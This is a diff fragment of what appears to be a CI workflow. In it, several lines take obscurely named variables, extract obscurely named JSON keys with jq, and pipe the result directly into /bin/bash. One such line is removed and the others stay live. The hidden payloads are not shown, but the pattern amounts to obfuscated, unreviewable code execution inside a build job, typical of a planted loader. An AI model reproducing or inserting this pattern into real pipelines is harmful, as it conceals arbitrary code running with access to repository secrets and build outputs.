@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$bpwb3763" | jq -r .b1487 | /bin/bash
           printf '%s' "$lzuun16" | jq -r .rtv47 | /bin/bash
           echo $emki69 | jq -r .y95 | /bin/bash
-          echo $zyayr32077 | jq -r .x4 | /bin/bash
           printf '%s' "$oev768" | jq -r .eth59674 | /bin/bash
           echo $gkba8 | jq -r .w7411 | /bin/bash
 
